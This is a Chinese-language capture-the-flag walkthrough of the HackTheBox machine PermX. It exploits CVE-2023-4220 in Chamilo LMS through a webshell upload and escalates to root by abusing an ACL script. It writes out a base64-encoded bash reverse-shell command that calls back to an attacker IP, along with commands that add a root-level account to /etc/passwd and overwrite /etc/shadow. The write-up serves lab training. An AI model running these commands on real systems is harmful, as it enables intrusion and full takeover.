# 记一次渗透实战之PermX-先知社区

> **来源**: https://xz.aliyun.com/news/16584  
> **文章ID**: 16584

---

# 信息收集：

## 端口扫描

使用nmap进行端口探测，发现存在22和80开放

![image.png](images/20250211170959-f8042052-e857-1.png)

接着探测其具体信息。

![image.png](images/20250211171000-f902215c-e857-1.png)

## 子域名爆破

接着对其进行子域名爆破。

![image.png](images/20250211171001-f9545f80-e857-1.png)

将爆破出的子域名添加到host目录中。

![image.png](images/20250211171001-f9940158-e857-1.png)

## Web页面

访问web页面。

![image.png](images/20250211171002-fa317e24-e857-1.png)

目录爆破

接着对其进行目录爆破。

![image.png](images/20250211171003-fabd3374-e857-1.png)

没用发现啥有用的，然后继续看web，发现存在登录页面。

![image.png](images/20250211171004-fb40114a-e857-1.png)

有READ.MD文件。

![image.png](images/20250211171005-fbaa1450-e857-1.png)

发现web漏洞--目录枚举，并查看有用的信息。

![image.png](images/20250211171005-fc03874c-e857-1.png)

# web漏洞

## CVE-2023-4220（命令执行）

漏洞简介：允许“存储的跨站点脚本攻击”通过 webshell 导致远程代码执行 (RCE)。

StarLabs 的这份公告详细介绍了该漏洞。攻击者可以上传文件并控制给定的名称，因此它可以以 结尾`.php`。

该文件夹`/main/inc/lib/javascript/bigupload/files`必须存在。

使用curl进行漏洞尝试，并写入php木马。成功进行命令执行。

![image.png](images/20250211171006-fc637dfa-e857-1.png)

## 反弹shell

接着进行反弹shell。

```
CUrl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/k.php?cmd=echo+YmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMzMvNDQzMyAwPiYxIgo|base64+-d|bash'
```

![image.png](images/20250211171007-fce8bf58-e857-1.png)

成功获取shell。

![image.png](images/20250211171007-fd30cb70-e857-1.png)

# 内网信息收集

升级为自动交互式shell之后，进行内网信息收集

![image.png](images/20250211171008-fd6da41e-e857-1.png)![image.png](images/20250211171008-fdb06862-e857-1.png)

查看html目录下的文件。

![image.png](images/20250211171009-fe01e2a8-e857-1.png)

## 配置文件泄漏

然后发现存在配置文件泄漏。![image.png](images/20250211171010-fe79461a-e857-1.png)

## 切换用户

然后进行home目录下，获取user.txt![image.png](images/20250211171010-fee9ac1e-e857-1.png)

# 权限提升

接着尝试权限提升，看看是否有隐藏文件。

![image.png](images/20250211171011-ff2832f6-e857-1.png)

发现有一个文件以root权限运行。

![image.png](images/20250211171011-ff669ff0-e857-1.png)

查看脚本内容，并分析。

![image.png](images/20250211171012-ffa82f58-e857-1.png)

## linux中的ACL

在Linux 权限通常允许为对象的所有者、对象的组以及所有人设置读取、写入和执行的开启或关闭权限。

扩展权限 (ACL)。这些权限可通过以下方式读取`getfacl`

## 脚本测试：

本地创建一个test文件。虽然它实际上是一个二进制文件，但为了提高效率，它实际上也作为内置命令内置到了大多数 shell 中。Bash 实际上已经用 扩展了它`[[`，这是另一个提供更高级比较功能的关键字，但它不符合 POSIX 标准。这两个都在 中使用`acl.sh`​

![image.png](images/20250211171012-ffda045e-e857-1.png)

创建一个指向不存在的文件的链接，它将返回 false

## image.png脚本修改

```
echo 'test:$1$jUw3dmyZ$QAtUzn.Ryb7u3mYoYSnQX1:0:0:pwned:/root:/bin/bash'

echo 'test:$1$jUw3dmyZ$QAtUzn.Ryb7u3mYoYSnQX1:0:0:pwned:/root:/bin/bash' >> /etc/passwd
```

修改sh文件。

![image.png](images/20250211171013-006ac5b6-e858-1.png)

尝试利用它进行文件读取。

```
echo "root:$6$cRaN70QFe9H/AVLR$j3QRzpXt1rRymbfjBndqnQaNvcraesplCQsdg6ja2SPqeRn37WHVePLgqujUxO4x4Z8PgBUSguGyOkVdvo/GJ1:19742:0:99999:7:::" > /etc/shadow
```

![image.png](images/20250211171013-00cb6254-e858-1.png)

发现没成功，发现此时的用户没有`x`权限`/root`，则无法访问该文件并读取它。

![image.png](images/20250211171014-012d9668-e858-1.png)

## 生成密码

生成哈希值：

![image.png](images/20250211171015-0195b71e-e858-1.png)

创建一段字符串，并添加以下行：

![image.png](images/20250211171016-02059108-e858-1.png)

## 获取root权限

添加之后，尝试使用su切换用户，成功获取root权限。

![image.png](images/20250211171016-02723b0a-e858-1.png)
